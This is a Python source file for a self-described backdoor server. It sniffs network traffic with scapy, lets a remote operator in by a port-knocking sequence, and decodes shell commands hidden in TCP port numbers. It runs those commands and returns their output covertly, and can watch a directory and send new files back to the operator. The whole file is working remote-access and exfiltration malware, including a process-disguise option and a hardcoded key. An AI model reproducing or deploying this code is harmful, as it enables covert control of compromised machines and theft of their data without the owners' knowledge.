import time
import base64
import argparse
import collections
import logging
import binascii
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from time import sleep
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from random import randint
from Crypto.Cipher import AES
CONN_IPS = collections.defaultdict(list)
CMDS = collections.defaultdict(list)
MONITOR = 0

MASTER_KEY = "CorrectHorseBatteryStapleGunHead"


class NewFileHandler(FileSystemEventHandler):

	def __init__(self, packet):
		self.packet = packet

	def on_created(self, event):
		global MONITOR
		filename = os.path.basename(event.src_path)
		f_binary = file_to_binary(filename, event.src_path)
		send_data(f_binary, self.packet[1].src, "write")
		MONITOR = 1


def encrypt_val(text):
	secret = AES.new(MASTER_KEY)
	tag_string = (str(text) + (AES.block_size - len(str(text)) % AES.block_size) * "\0")
	cipher_text = base64.b64encode(secret.encrypt(tag_string))
	return cipher_text


def decrypt_val(cipher):
	secret = AES.new(MASTER_KEY)
	decrypted = secret.decrypt(base64.b64decode(cipher))
	result = decrypted.rstrip("\0")
	return result


def verify_root():
	if(os.getuid() != 0):
		exit("This program must be run with root/sudo")


def file_to_binary(file, path):
	f = open(path, "rb")
	header = file + '\0'
	byte = header + f.read()
	binary = list(bin(int('1'+binascii.hexlify(byte), 16))[3:].zfill(8))
	binary = ''.join(binary)
	byte_list = [binary[i:i+8] for i in range(0, len(binary), 8)]
	return byte_list


def data_packet(dest, val1, val2=None):
	if(len(val1) == 1):
		if(val2 is None):
			destport = ord(val1) << 8
		else:
			destport = (ord(val1) << 8) + ord(val2)
	else:
		if(val2 is None):
			destport = int(val1, 2)
		else:
			destport = int(val1 + val2, 2)
	return IP(dst=dest) / TCP(sport=80, dport=destport)


def end_msg(dest, output_type):
	randPort = randint(1500, 65535)
	if(output_type == "print"):
		type_id = 42424
	elif(output_type == "write"):
		type_id = 41414
	packet = IP(dst=dest, id=type_id) / TCP(dport=randPort, sport=80)
	send(packet)


def send_data(msg, ip, output_type):
	for char1, char2 in zip(msg[0::2], msg[1::2]):
		# delay_sleep()
		send(data_packet(ip, char1, char2))
	if(len(msg) % 2):
		# delay_sleep()
		send(data_packet(ip, msg[-1]))
	end_msg(ip, output_type)


def run_cmd(packet, cmd):
	output = []
	try:
		command, arguments = cmd.split(' ', 1)
	except ValueError:
		command = cmd.rstrip('\0')
		arguments = None
	print("Running command: {} {}".format(command, arguments))
	try:
		if(arguments is not None):
			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
		else:
			out, err = Popen(command, stdout=PIPE, stderr=PIPE).communicate()
	except OSError:
		output = "Invalid Command / Command not found"
	if(out):
		output.append(out)
	if(err):
		output.append(err)
	# output = encrypt_val("".join(output))
	time.sleep(0.1)
	send_data(''.join(output), packet[1].src, "print")


def watch_dir(packet, path):
	path = path.rstrip('\0')
	event_handler = NewFileHandler(packet)
	observer = Observer()
	observer.schedule(event_handler, path, recursive=False)
	observer.start()

	while MONITOR == 0:
		sleep(1)
	observer.stop()
	observer.join()


def execute(packet, command):
	cmd = command.split(' ', 1)
	if(cmd[0] == "run"):
		run_cmd(packet, cmd[1])
	elif(cmd[0] == "watch"):
		watch_dir(packet, cmd[1])
	else:
		print(cmd)


def decode(packet):
	global CMDS
	ip = packet[1].src
	if(packet[1].id == 42424):
		execute(packet, ''.join(CMDS[ip]))
		CMDS[ip] = ""
		return
	dport = packet[2].dport
	char1 = chr((dport >> 8) & 0xff)
	char2 = chr(dport & 0xff)
	if(char2 is not None):
		CMDS[ip] += "{}{}".format(char1, char2)
	else:
		CMDS[ip] += "{}".format(char1)


def port_knock_auth(packet):
	global CONN_IPS
	ip = packet[1].src
	dport = packet[2].dport
	sport = packet[2].sport
	access = [2525, 14156, 6364]
	dc = 4242

	# If the connecting IP has connected before
	if(ip in CONN_IPS):
		auth = CONN_IPS[ip]
		# Connecting IP is already authenticated
		if(auth == 3):
			if(dport == dc):
				del CONN_IPS[ip]
				print("{} has disconnected".format(ip))
				return
			if(sport == 80):
				decode(packet)
				return
		elif(dport not in access):
			del CONN_IPS[ip]
		# Connecting IP matches second knock
		elif(dport == access[auth]):
			CONN_IPS[ip] += 1
		else:
			# Fail-safe
			del CONN_IPS[ip]
	elif(dport == access[0]):
		CONN_IPS[ip] = 1


def main():
	print("Sniffing for traffic...")
	sniff(filter="tcp", iface=args.iface, prn=port_knock_auth)


if __name__ == '__main__':
	verify_root()
	parser = argparse.ArgumentParser("Python backdoor server")
	parser.add_argument("-p", "--pname", help="Disguise process title")
	parser.add_argument("-i", "--iface", help="Interface to sniff packets on")
	args = parser.parse_args()
	try:
		main()
	except KeyboardInterrupt:
		exit("Ctrl+C received. Exiting...")
